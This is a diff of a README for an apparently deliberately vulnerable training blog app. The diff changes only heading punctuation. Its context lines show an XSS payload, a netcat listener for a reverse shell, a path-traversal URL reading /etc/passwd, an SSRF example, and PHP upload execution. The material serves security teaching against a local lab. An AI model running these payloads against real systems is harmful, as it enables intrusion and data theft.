@@ -54,7 +54,7 @@ Valid SQL injection queries are:
 <username>' #
 ```
 
-### A7:2017-Cross-Site Scripting (XSS)
+### A7:2017 – Cross-Site Scripting (XSS)
 Create a blogpost including the following payload:
 ```
 <script>alert("XSS");</script>
@@ -70,13 +70,13 @@ Additionally start a netcat listener using:
 nc -lvnkp 1234
 ```
 
-### A04:2013 - Insecure Direct Object References
+### A04:2013 – Insecure Direct Object References
 Try accessing:
 ```
 http://127.0.0.1/vulnblog/index.php?page=../../../../../../../../etc/passwd
 ```
 
-### A10:2021 - Server-Side Request Forgery (SSRF)
+### A10:2021 – Server-Side Request Forgery (SSRF)
 Clicking on Dogs sends a GET Request with an imaginery API Key to the dog ceo API.
 The URL looks like that: http://localhost/vulnblog/index.php?page=dogs.php&url=https://dog.ceo/api/breeds/image/random
 
@@ -102,7 +102,7 @@ Vulnblog offers the capability to upload images in blog entries. The access is n
 http://localhost/vulnblog/uploads/
 ```
 
-### A03:2007 - Malicious File Execution
+### A03:2007 – Malicious File Execution
 Unrestricted file uploads:
 
 You can upload a PHP script to execute malicious code.
